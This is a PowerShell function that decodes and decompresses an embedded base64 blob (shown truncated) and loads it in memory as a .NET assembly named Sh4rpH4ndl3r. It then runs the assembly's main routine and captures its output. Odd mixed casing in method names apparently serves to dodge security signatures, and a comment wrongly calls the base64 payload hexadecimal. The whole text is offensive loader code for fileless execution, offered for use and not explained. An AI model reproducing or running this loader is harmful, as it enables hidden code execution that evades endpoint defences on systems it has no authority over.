function Invoke-SharpHandler
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = "-d"
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4s...AQA"))# The omitted "H4s...AQA" is actually a 204241 character long hexadecimal string.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    [Sh4rpH4ndl3r.Program]::main($Command.Split(" "))
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
